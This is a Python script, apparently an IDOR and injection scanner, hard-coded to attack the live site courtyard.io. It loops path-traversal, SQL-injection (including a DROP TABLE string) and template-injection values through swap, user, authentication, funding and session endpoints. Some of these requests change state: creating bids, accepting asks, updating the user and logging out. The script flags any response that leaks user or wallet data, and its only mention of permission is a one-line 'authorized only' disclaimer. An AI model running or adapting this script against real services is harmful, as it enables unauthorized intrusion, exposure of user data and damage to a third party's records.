#!/usr/bin/env python3
"""
Courtyard.io IDOR Scanner
Tests swap negotiation and user endpoints for IDOR vulnerabilities.
FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY
"""
import requests
import json
import random
import string
from datetime import datetime
from pathlib import Path

BASE_URL = "https://courtyard.io"
API_URL = f"{BASE_URL}/api"
V2_URL = f"{API_URL}/v2"

# Test IDs to try (common patterns)
TEST_IDS = [
    "1", "2", "3", "4", "5", "10", "100", "1000",
    "00000000-0000-0000-0000-000000000001",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "11111111-1111-1111-1111-111111111111",
    "12345678-1234-1234-1234-123456789012",
    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "00000000000000000000000000000000",
    "test", "admin", "null", "undefined", "true",
    "../../../../etc/passwd",
    "1' OR '1'='1", "1 OR 1=1", 
    "'; DROP TABLE users; --",
    "${7*7}", "{{7*7}}",
    "😀", "∞", "NULL",
]

class CourtyardIDOR:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self.findings = []
        self.log_dir = Path.home() / "courtyard_idor"
        self.log_dir.mkdir(exist_ok=True)
    
    def log(self, data):
        """Log a finding."""
        with open(self.log_dir / "findings.jsonl", "a") as f:
            f.write(json.dumps(data, default=str, indent=2) + "\n")
    
    def test_endpoint(self, method: str, path: str, description: str = ""):
        """Test a single endpoint for IDOR by substituting test IDs."""
        results = []
        
        for test_id in TEST_IDS:
            # Replace {id}, {negotiationId}, {bidId} placeholders
            test_path = path.replace("{id}", str(test_id))
            test_path = test_path.replace("{negotiationId}", str(test_id))
            test_path = test_path.replace("{bidId}", str(test_id))
            test_path = test_path.replace("{ask_id}", str(test_id))
            test_path = test_path.replace("{negotiation_id}", str(test_id))
            test_path = test_path.replace("{userId}", str(test_id))
            test_path = test_path.replace("{bid_id}", str(test_id))
            
            url = f"{API_URL}{test_path}" if not test_path.startswith("/v2") else f"{BASE_URL}{test_path}"
            
            try:
                if method == "GET":
                    resp = self.session.get(url, timeout=10)
                elif method == "POST":
                    resp = self.session.post(url, json={}, timeout=10)
                elif method == "PUT":
                    resp = self.session.put(url, json={}, timeout=10)
                elif method == "DELETE":
                    resp = self.session.delete(url, timeout=10)
                else:
                    continue
                
                result = {
                    "timestamp": datetime.now().isoformat(),
                    "method": method,
                    "url": url,
                    "test_id": test_id,
                    "status_code": resp.status_code,
                    "content_length": len(resp.text),
                    "content_type": resp.headers.get("Content-Type", ""),
                    "has_json": False,
                    "has_user_data": False,
                    "has_error": False,
                    "potential_vuln": False,
                    "response_body": resp.text[:500] if resp.status_code != 200 else resp.text[:100],
                }
                
                # Check for JSON response (potential IDOR)
                try:
                    data = resp.json()
                    result["has_json"] = True
                    
                    # Check for user data in response
                    user_keywords = ["user", "email", "name", "wallet", "balance", "id", "address", "account"]
                    for kw in user_keywords:
                        if kw.lower() in str(data).lower():
                            result["has_user_data"] = True
                            break
                    
                    # Check for error messages that reveal info
                    error_keywords = ["unauthorized", "forbidden", "permission", "access denied", "invalid token"]
                    for kw in error_keywords:
                        if kw.lower() in str(data).lower():
                            result["has_error"] = True
                            break
                    
                    # Potential vuln: 200 with user data
                    if resp.status_code == 200 and result["has_user_data"]:
                        result["potential_vuln"] = True
                    
                except:
                    pass
                
                # Potential vuln: different status codes for different IDs
                if resp.status_code in [200, 201, 403, 404]:
                    results.append(result)
                    
            except Exception as e:
                continue
        
        return results
    
    def run_all(self):
        """Run IDOR scan on all endpoints."""
        
        # Endpoints that might be vulnerable to IDOR
        endpoints = [
            # Swap endpoints (highest priority)
            ("GET", "/v2/swap/negotiations/{id}", "Swap negotiation by ID"),
            ("GET", "/v2/swap/negotiations/{negotiationId}/asks", "Swap asks"),
            ("GET", "/v2/swap/negotiations/{negotiation_id}/bids", "Swap bids"),
            ("GET", "/v2/swap/bids/{bidId}", "Swap bid by ID"),
            ("GET", "/v2/swap/users/{userId}/negotiations", "User negotiations"),
            ("POST", "/v2/swap/negotiations/{id}/asks", "Create ask"),
            ("POST", "/v2/swap/negotiations/{id}/bids", "Create bid"),
            ("POST", "/v2/swap/negotiations/{negotiation_id}/asks/{ask_id}/accept", "Accept ask"),
            
            # User endpoints
            ("GET", "/v1/users/me", "Current user"),
            ("GET", "/v1/users/{id}", "User by ID"),
            ("PUT", "/v1/users/me", "Update user"),
            
            # Auth endpoints
            ("POST", "/v1/farcaster/authenticate", "Farcaster auth"),
            ("POST", "/v1/siwe/authenticate", "SIWE auth"),
            ("POST", "/v1/oauth/authenticate", "OAuth auth"),
            
            # Funding endpoints
            ("POST", "/v1/funding/coinbase_on_ramp/init", "Coinbase on-ramp"),
            ("POST", "/v1/funding/moonpay_on_ramp/sign", "Moonpay sign"),
            
            # Session endpoints
            ("GET", "/v1/sessions", "Sessions"),
            ("DELETE", "/v1/sessions/logout", "Logout"),
        ]
        
        print("=" * 60)
        print("COURTYARD.IO IDOR SCANNER")
        print("=" * 60)
        print(f"Base URL: {BASE_URL}")
        print(f"Test IDs: {len(TEST_IDS)}")
        print(f"Endpoints: {len(endpoints)}")
        print("=" * 60)
        
        for i, (method, path, desc) in enumerate(endpoints):
            print(f"\n[{i+1}/{len(endpoints)}] Testing: {method} {path} ({desc})")
            results = self.test_endpoint(method, path, desc)
            
            # Check for IDOR patterns
            status_codes = [r["status_code"] for r in results]
            unique_codes = set(status_codes)
            
            if len(unique_codes) > 1:
                print(f"  ⚠️  MIXED STATUS CODES: {unique_codes}")
                for r in results:
                    if r["potential_vuln"]:
                        print(f"  🚨 POTENTIAL IDOR: {r['test_id']} -> {r['status_code']} (user data: {r['has_user_data']})")
                        self.log(r)
                        self.findings.append(r)
            elif 200 in unique_codes:
                print(f"  ℹ️  All 200s (may need auth)")
            else:
                print(f"  ✓  Consistent: {unique_codes}")
        
        # Summary
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)
        print(f"Total findings: {len(self.findings)}")
        
        if self.findings:
            print("\n🚨 POTENTIAL VULNERABILITIES:")
            for f in self.findings:
                print(f"  [{f['method']}] {f['url']}")
                print(f"    Status: {f['status_code']} | Test ID: {f['test_id']}")
                print(f"    User data: {f['has_user_data']} | Error: {f['has_error']}")
                print(f"    Body: {f['response_body'][:100]}")
                print()
        
        # Save full results
        with open(self.log_dir / "scan_results.json", "w") as f:
            json.dump(self.findings, f, indent=2, default=str)
        
        print(f"Full results: {self.log_dir / 'scan_results.json'}")
        
        return self.findings

if __name__ == "__main__":
    scanner = CourtyardIDOR()
    scanner.run_all()
